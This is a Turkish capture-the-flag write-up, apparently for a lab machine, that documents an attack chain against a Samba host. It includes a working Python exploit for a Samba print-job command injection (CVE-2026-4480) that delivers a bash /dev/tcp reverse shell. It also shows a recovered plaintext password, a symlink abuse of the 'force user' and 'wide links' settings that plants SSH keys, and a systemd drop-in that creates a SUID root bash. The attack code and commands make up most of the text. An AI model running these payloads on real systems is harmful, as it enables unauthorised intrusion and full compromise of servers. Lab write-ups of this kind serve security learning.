@@ -1,0 +1,250 @@
+## Keşif
+
+Standart bir nmap taramasıyla başladım:
+
+```bash
+nmap -sC -sV -p- --min-rate 5000 -oA full_scan ip
+```
+
+Açık portlar:
+
+```
+22/tcp  — OpenSSH 9.6p1 (Ubuntu)
+139/tcp — Samba
+445/tcp — Samba
+```
+
+Web servisi yok, doğrudan SMB'ye odaklandım.
+
+---
+
+## SMB Enumeration
+
+Null session ile share listesini çektim:
+
+```bash
+smbclient -L //ip -N
+```
+
+```
+HP-Reception    Printer   Reception printer
+projects        Disk      Hartley Group Project Files
+transfer        Disk      Staff file transfer
+IPC$            IPC       IPC Service
+```
+
+`projects` ve `transfer` anonim erişimi reddetti. `HP-Reception` ise bir yazıcı paylaşımı ve guest erişime açık — bu önemli bir detay.
+
+RPC üzerinden kullanıcı enumeration yaptım:
+
+```bash
+rpcclient -U '' -N ip -c 'enumdomusers'
+```
+
+```
+user:[scott] rid:[0x3e8]
+```
+
+`scott` adında tek bir kullanıcı var, tam adı `Scott Mercer`.
+
+---
+
+## Foothold — CVE-2026-4480 (Samba Print Command Injection)
+
+Makineye web servisi olmadığından ve tek açık guest erişim noktası yazıcı paylaşımı olduğundan, burada Samba'nın print subsystem'ındaki bir açık aklıma geldi.
+
+CVE-2026-4480, Samba'nın print komutunu çalıştırırken job name'i (`%J` makrosu) shell'e escape etmeden geçirmesinden kaynaklanıyor. Sıradan `smbclient` ile job göndermek işe yaramıyor çünkü RAP arayüzü metacharacter'ları temizliyor. Doğrudan `spoolss` RPC pipe'ına bağlanmak gerekiyor — bunu Samba'nın Python binding'leri ile yapabiliyoruz.
+
+Exploit mantığı şu: `StartDocPrinter`'a `document_name = "|sh"` gönderiyoruz. Samba bunu `%J` yerine koyduğunda komut şu hale geliyor:
+
+```
+/usr/local/bin/printaudit |sh <spoolfile>
+```
+
+Spool dosyasının içeriği de (`WritePrinter`) shell script olarak çalışıyor. Reverse shell'i bu dosyaya yazıyoruz:
+
+```python
+#!/usr/bin/env python3
+from samba.dcerpc import spoolss
+from samba.param import LoadParm
+from samba.credentials import Credentials
+
+RHOST = "ip"
+LHOST = "tun0"
+LPORT = 4444
+
+DATA = ("setsid bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1' >/dev/null 2>&1 &\n" % (LHOST, LPORT)).encode()
+
+lp = LoadParm(); lp.load_default()
+creds = Credentials(); creds.guess(lp); creds.set_anonymous()
+
+iface = spoolss.spoolss(r"ncacn_np:%s[\pipe\spoolss]" % RHOST, lp, creds)
+h = iface.OpenPrinter("\\\\%s\\HP-Reception" % RHOST, "", spoolss.DevmodeContainer(), 0x00000008)
+
+i1 = spoolss.DocumentInfo1()
+i1.document_name = "|sh"
+i1.output_file = None
+i1.datatype = "RAW"
+
+ctr = spoolss.DocumentInfoCtr()
+ctr.level = 1
+ctr.info = i1
+
+iface.StartDocPrinter(h, ctr)
+iface.StartPagePrinter(h)
+iface.WritePrinter(h, DATA, len(DATA))
+iface.EndPagePrinter(h)
+iface.EndDocPrinter(h)
+iface.ClosePrinter(h)
+```
+
+`setsid ... &` ile komutu arka plana aldım — aksi halde `EndDocPrinter` çağrısı print komutu bitene kadar bloke oluyor.
+
+```bash
+nc -lvnp 4444
+python3 exploit.py
+```
+
+`nobody` olarak shell aldım.
+
+---
+
+## nobody → scott
+
+`/opt/offsite-backup/` dizini world-readable'dı:
+
+```bash
+cat /opt/offsite-backup/rclone.conf
+```
+
+```ini
+[offsite]
+type = sftp
+host = backup.hartley-group.internal
+user = svc-backup
+pass = x
+```
+
+rclone şifreleri gerçek anlamda şifrelemez, sadece gizler. `rclone reveal` ile plaintext'e döndürdüm:
+
+```bash
+rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
+# iXzvcib3SrpZ
+```
+
+Bu şifre `scott` hesabında yeniden kullanılmıştı:
+
+```bash
+ssh scott@10.129.244.177
+# x
+```
+
+```
+scott@abducted:~$ cat user.txt
+x
+```
+
+---
+
+## scott → marcus (Samba force user + wide links)
+
+`/etc/samba/shares.conf`'a baktığımda `transfer` paylaşımı dikkatimi çekti:
+
+```ini
+[transfer]
+path = /srv/transfer
+valid users = scott
+force user = marcus
+read only = no
+wide links = yes
+```
+
+Global config'de de:
+
+```ini
+unix extensions = no
+allow insecure wide links = yes
+```
+
+`force user = marcus` şu anlama geliyor: `transfer` share'ine bağlanan herkes kim olursa olsun, tüm dosya işlemleri `marcus` olarak çalışır. `wide links = yes` ise Samba'nın share dizini dışına işaret eden sembolik linkleri takip etmesine izin veriyor. Bu iki ayar bir araya gelince tehlikeli bir kombinasyon oluşuyor.
+
+`/srv/transfer` scott'a ait, yani oraya symlink oluşturabiliyorum:
+
+```bash
+ssh-keygen -q -t ed25519 -N '' -f /tmp/k
+ln -s /home/marcus /srv/transfer/mh
+smbclient //127.0.0.1/transfer -U 'scott%iXzvcib3SrpZ' \
+  -c 'mkdir mh/.ssh; put /tmp/k.pub mh/.ssh/authorized_keys'
+```
+
+Samba symlink'i takip etti, `force user` sayesinde dosyayı `marcus` olarak yazdı. Oluşan `authorized_keys` dosyasının sahibi `marcus`.
+
+```bash
+ssh -i /tmp/k marcus@ip
+```
+
+---
+
+## marcus → root (polkit + systemd drop-in)
+
+`marcus` kullanıcısı `operators` grubunun üyesi:
+
+```
+uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
+```
+
+`/etc/systemd/system/smbd.service.d/` dizininin izinlerine baktım:
+
+```
+drwxrws--- root operators /etc/systemd/system/smbd.service.d
+```
+
+Dizin `operators` grubuna yazılabilir ve setgid. Yani içine `.conf` dosyası bırakabiliyorum. systemd drop-in'leri servis yüklendiğinde ana unit dosyasıyla birleşiyor.
+
+`smbd` root olarak çalıştığı için `ExecStartPre` direktifleri de root olarak işletiliyor.
+
+Polkit kontrolü yaptım — `operators` grubunun `org.freedesktop.systemd1.reload-daemon` iznine sahip olduğunu gördüm. Ayrıca `smbd.service` için `manage-units` de devredilmiş durumda, bu yüzden `systemctl restart smbd` şifre sormadan çalışıyor.
+
+Drop-in'i yazdım:
+
+```bash
+cat > /etc/systemd/system/smbd.service.d/override.conf << 'EOF'
+[Service]
+ExecStartPre=/bin/cp /bin/bash /tmp/.rb
+ExecStartPre=/bin/chmod 4755 /tmp/.rb
+EOF
+
+systemctl daemon-reload
+systemctl restart smbd
+```
+
+```bash
+/tmp/.rb -p -c 'id; cat /root/root.txt'
+```
+
+```
+euid=0(root)
+x
+```
+## Saldırı Zinciri
+
+```
+Guest SMB (HP-Reception)
+        ↓
+CVE-2026-4480 — spoolss RPC print job injection
+        ↓
+nobody shell
+        ↓
+/opt/offsite-backup/rclone.conf → rclone reveal → şifre
+        ↓
+SSH → scott (user flag)
+        ↓
+transfer share: force user=marcus + wide links → authorized_keys yaz
+        ↓
+SSH → marcus
+        ↓
+operators grubu → /etc/systemd/system/smbd.service.d/ yazılabilir
+polkit → systemctl restart smbd yetkisi
+        ↓
+ExecStartPre drop-in → SUID bash → root (root flag)
+```
